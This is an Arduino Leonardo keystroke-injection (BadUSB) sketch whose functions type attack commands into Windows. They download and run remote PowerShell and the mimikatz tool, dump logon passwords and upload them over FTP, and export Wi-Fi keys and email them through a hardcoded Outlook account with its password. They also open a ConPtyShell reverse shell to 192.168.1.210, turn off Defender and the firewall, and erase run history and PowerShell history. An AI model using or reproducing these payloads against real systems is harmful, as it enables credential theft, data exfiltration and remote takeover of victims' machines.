#include <phukdlib_leonardo.h>
#define kbd_es_es


void RickRoll() {
  // Wait 500ms
  delay(500);

  delay(2000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);
  Keyboard.print(F("powershell -w h -NoP -NonI -Exec Bypass $U='https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/Assets/rr.zip';$Z=\"$env:TMP\"+'\\rr.zip';$D=\"$env:TMP\"+'\\rr';iwr -Uri $U -O $Z;Expand-Archive $Z -DestinationPath $D\\ -Force;powershell $D\\rr.ps1"));

  Keyboard.press(KEY_RETURN);
}
void Mimikatz_ftp() {
  delay(2000);
  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.print("cmd");
  delay(2000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(100);
  Keyboard.releaseAll();
  delay(4000);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.println("ftp");
  delay(3000);
  Keyboard.println("open 10.1.206.174");
  delay(10000);
  Keyboard.println("pi");
  delay(3000);
  Keyboard.println("kali");
  delay(5000);
  Keyboard.println("binary");
  delay(2000);
  Keyboard.println("GET mimikatz.exe");
  delay(5000);
  Keyboard.println("bye");
  delay(3000);
  Keyboard.println("mimikatz.exe");
  delay(4000);
  Keyboard.println("log");
  delay(2000);
  Keyboard.println("privilege::debug");
  delay(3000);
  Keyboard.println("sekurlsa::logonPasswords full");
  delay(10000);
  Keyboard.println("exit");
  delay(3000);
  Keyboard.println("ftp");
  delay(3000);
  Keyboard.println("open 10.1.206.174");
  delay(10000);
  Keyboard.println("pi");
  delay(3000);
  Keyboard.println("kali");
  delay(5000);
  Keyboard.println("PUT mimikatz.log");
  delay(3000);
  Keyboard.println("bye");
  delay(3000);
  Keyboard.println("del mimikatz.exe");
  delay(3000);
  Keyboard.println("del mimikatz.log");
  delay(3000);
  Keyboard.println("exit");
}


void Scanner() {

  // Wait 500ms
  delay(500);

  delay(2000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();

  delay(150);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(400);
  Keyboard.print("cmd");

  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(500);
  Keyboard.print(F("color FE & mode con:cols=18 lines=1"));
  Keyboard.press(KEY_RETURN);

  delay(3000);
  // --> Harvest
  Keyboard.print(F("cd Desktop \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("mkdir A \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("cd A \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("netsh wlan export profile key=clear \n"));

  Keyboard.press(KEY_RETURN);

  delay(400);
  Keyboard.print(F("cd .. \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("powershell \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("Compress-Archive -Path A -DestinationPath A.zip -Force \n"));

  Keyboard.press(KEY_RETURN);
  delay(500);
  // --> Outlook SMTP
  
  Keyboard.print(F("[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n"));
  Keyboard.press(KEY_RETURN);
  delay(400);
 
  Keyboard.print(F("$SMTPServer = 'smtp.office365.com' \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587) \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("$SMTPInfo.EnableSsl = $true \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('hackerUtad@outlook.com', 'Kalikali') \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("$ReportEmail = New-Object System.Net.Mail.MailMessage \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("$ReportEmail.From = 'hackerUtad@outlook.com' \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("$ReportEmail.To.Add('hackerUtad@outlook.com') \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("$ReportEmail.Subject = \"Esto no es sospechoso\" \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("$ReportEmail.Body = \"Por favor funciona\" \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("$ReportEmail.Attachments.Add(\"A.zip\") \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("$SMTPInfo.Send($ReportEmail) \n"));

  Keyboard.press(KEY_RETURN);

  delay(400);
  // --> Clean up
  Keyboard.print(F("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("cd AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("del ConsoleHost_history.txt \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("exit \n"));

  Keyboard.press(KEY_RETURN);

  delay(400);
  Keyboard.print(F("del A & rmdir A \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("S \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("del A.zip & exit \n"));

  Keyboard.press(KEY_RETURN);

  Keyboard.releaseAll();

}

void ReverseShell() {
  
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(300);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(20);
  // --> Opens Task Manager
  Keyboard.print(F("taskmgr"));

  delay(150);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('f');
  Keyboard.press('n');
  Keyboard.releaseAll();

  delay(50);
  // --> Starts CMD
  Keyboard.print(F("cmd"));

  typeKey(KEY_TAB);

  // --> Turn On Admin Privileges
  typeKey(' ');

  // --> Run
  typeKey(KEY_RETURN);

  delay(20);
  Keyboard.print(F("taskkill /IM taskmgr.exe && powershell -WindowStyle hidden Set-MpPreference -DisableRealtimeMonitoring $true; IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell [192.168.1.210] [8080]\");"));

  // Ending stream
  Keyboard.end();

}

void Firewall() {
  delay(2000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.print("powershell.exe netsh advfirewall set currentprofile state off");
  delay(2000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
/////////////////////////////////////////////////////////// DEFENDER

  delay(2000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();
  
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.releaseAll();

  delay(500);
  Keyboard.print(F("virus"));
  Keyboard.releaseAll();
  delay(500);

  Keyboard.press(KEY_DOWN_ARROW);
  Keyboard.press(KEY_UP_ARROW);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(3000);
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(500);

  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(200);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(2000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.releaseAll();
  Keyboard.press('s');
  Keyboard.releaseAll();
}
